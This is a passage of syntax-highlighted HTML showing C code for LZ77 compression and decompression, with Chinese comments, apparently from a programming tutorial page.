id=\"crayon-5b4d7bc4732a6740937600-113\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-114\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">/*编码一个字符标记*/</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-115\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">token</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0x00000000</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-116\"> </div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-117\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">/*设置未匹配的字符*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-118\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">token</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">token</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">next</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-119\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-120\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">/*设置标记的位数*/</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-121\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">tbits</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">LZ77_SYMBOL_BITS</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-122\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-123\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-124\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">/*确定标记是大端格式*/</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-125\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">token</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">htonl</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">token</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-126\"> </div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-127\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">/*将标记写入压缩缓冲区*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-128\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">for</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">tbits</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-129\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-130\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">opos</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-131\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-132\"><span class=\"crayon-h\">                </span><span class=\"crayon-c\">/*为压缩缓冲区分配临时空间*/</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-133\"><span class=\"crayon-h\">                </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">temp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">)</span><span class=\"crayon-e\">realloc</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">comp</span><span class=\"crayon-sy\">,</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">opos</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-134\"><span class=\"crayon-h\">                </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-135\"><span class=\"crayon-h\">                    </span><span class=\"crayon-e\">free</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">comp</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-136\"><span class=\"crayon-h\">                    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-137\"><span class=\"crayon-h\">                </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-138\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">comp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">temp</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-139\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-140\"> </div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-141\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">tpos</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tbits</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-142\"><span class=\"crayon-h\">            </span><span class=\"crayon-e\">bit_set</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">comp</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">opos</span><span class=\"crayon-sy\">,</span><span class=\"crayon-e\">bit_get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">token</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">tpos</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-143\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">opos</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-144\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-145\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">/*调整短语长度*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-146\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">length</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-147\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-148\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">/*从前向缓冲区中拷贝数据到滑动窗口中*/</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-149\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">memmove</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">window</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">window</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">LZ77_WINDOW_SIZE</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-150\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">memmove</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">window</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">LZ77_WINDOW_SIZE</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">buffer</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-151\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">memmove</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">buffer</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">buffer</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">LZ77_BUFFER_SIZE</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-152\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">/*向前向缓冲区中读取更多数据*/</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-153\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">for</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">LZ77_BUFFER_SIZE</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">LZ77_BUFFER_SIZE</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ipos</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-154\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-155\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">buffer</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">original</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">ipos</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-156\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">ipos</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-157\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-158\"> </div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-159\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">/*调整剩余未匹配的长度*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-160\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">remaining</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">remaining</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-161\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-162\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/*指向压缩数据缓冲区*/</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-163\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">compressed</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">comp</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-164\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/*返回压缩数据中的字节数*/</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-165\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">opos</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-166\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-167\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-168\"><span class=\"crayon-c\">/*lz77_uncompress  解压缩由lz77_compress压缩的数据*/</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-169\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">lz77_uncompress</span><span class=\"crayon-sy\">(</span><span class=\"crayon-m\">const</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">compressed</span><span class=\"crayon-sy\">,</span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">original</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-170\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-171\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">window</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">LZ77_WINDOW_SIZE</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-172\"><span class=\"crayon-h\">                  </span><span class=\"crayon-v\">buffer</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">LZ77_BUFFER_SIZE</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-173\"><span class=\"crayon-h\">                  </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">orig</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-174\"><span class=\"crayon-h\">                  </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">temp</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-175\"><span class=\"crayon-h\">                  </span><span class=\"crayon-v\">next</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-176\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\">           </span><span class=\"crayon-v\">offset</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-177\"><span class=\"crayon-h\">                  </span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-178\"><span class=\"crayon-h\">                  </span><span class=\"crayon-v\">remaining</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-179\"><span class=\"crayon-h\">                  </span><span class=\"crayon-v\">hsize</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-180\"><span class=\"crayon-h\">                  </span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-181\"><span class=\"crayon-h\">                  </span><span class=\"crayon-v\">ipos</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-182\"><span class=\"crayon-h\">                  </span><span class=\"crayon-v\">opos</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-183\"><span class=\"crayon-h\">                  </span><span class=\"crayon-v\">tpos</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-184\"><span class=\"crayon-h\">                  </span><span class=\"crayon-v\">state</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-185\"><span class=\"crayon-h\">                  </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-186\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/*使指向原始数据的指针暂时无效*/</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-187\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">original</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">orig</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-188\"> </div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-189\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/*获取头部信息*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-190\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">hsize</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-191\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">memcpy</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">compressed</span><span class=\"crayon-sy\">,</span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-192\"> </div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-193\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/*初始化滑动窗口和前向缓冲区*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-194\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">memset</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">window</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">LZ77_WINDOW_SIZE</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-195\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">memset</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">buffer</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">LZ77_BUFFER_SIZE</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-196\"> </div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-197\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/*解压缩数据*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-198\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">ipos</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">hsize *</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-199\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">opos</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-200\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">remaining</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-201\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-202\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">while</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">remaining</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-203\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-204\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">/*获取压缩数据中的下一位*/</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-205\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">state</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">bit_get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">compressed</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">ipos</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-206\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">ipos</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-207\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-208\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">state</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-209\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-210\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">/*处理的是短语标记*/</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-211\"><span class=\"crayon-h\">            </span><span class=\"crayon-e\">memset</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">offset</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div 